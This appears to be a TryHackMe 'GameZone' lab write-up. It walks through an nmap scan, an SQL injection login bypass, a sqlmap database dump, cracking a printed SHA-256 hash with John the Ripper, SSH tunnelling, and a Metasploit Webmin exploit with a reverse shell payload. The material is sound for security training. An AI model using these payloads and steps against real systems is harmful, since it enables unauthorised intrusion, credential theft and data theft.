# TryHackMe | GameZone

Room Link - "https://tryhackme.com/room/gamezone"

> Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

**Nmap Scan Results -** 

```shell
 ➥ $ nmap -sCV -p- 10.10.168.124
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-22 03:43 +0000
Nmap scan report for 10.10.168.124
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.70 seconds

```

## 1. Obtain access via SQLi

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:
	**SELECT * FROM users WHERE username = :username AND password := password**

If we have our username as admin and our password as: **' or 1=1 -- -** it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:
	**SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -**

```
The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.
```

## 2. Using SQLMap

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

We're going to use SQLMap to dump the entire database for GameZone. First we need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).

Save the request into a text file. We can then pass this into SQLMap to use our authenticated user session.

```shell
$ sqlmap -r /home/sam/Downloads/request.txt --dbms=mysql --dump
```
- **-r** uses the intercepted request we saved
- **--dbms** tells SQLMap what type of database management system it is
- **--dump** attempts to outputs the entire database

## 3. Cracking a password with JohnTheRipper

John the Ripper (JTR) is a fast, free and open-source password cracker.

This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.

hash.txt
```
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

```shell
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=RAW-SHA256
```
videogamer124

## 4. Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

**-L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.

**-R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

We will use a tool called **ss** to investigate sockets running on a host.

If we run **ss -tulpn** it will tell us what socket connections are running

| **Argument** | **Description**                    |
| ------------ | ---------------------------------- |
| -t           | Display TCP sockets                |
| -u           | Display UDP sockets                |
| -l           | Displays only listening sockets    |
| -p           | Shows the process using the socket |
| -n           | Doesn't resolve service names      |

SSH Tunelling - 
```shell
$ ssh -L 10000:localhost:10000 agent47@10.10.168.124
```

## 5. Privilege Escalation with Metasploit

```shell

msfconsole
use exploit/unix/webapp/webmin_show_cgi_exec
show payloads
payload/cmd/unix/reverse
sessions -i 1
```

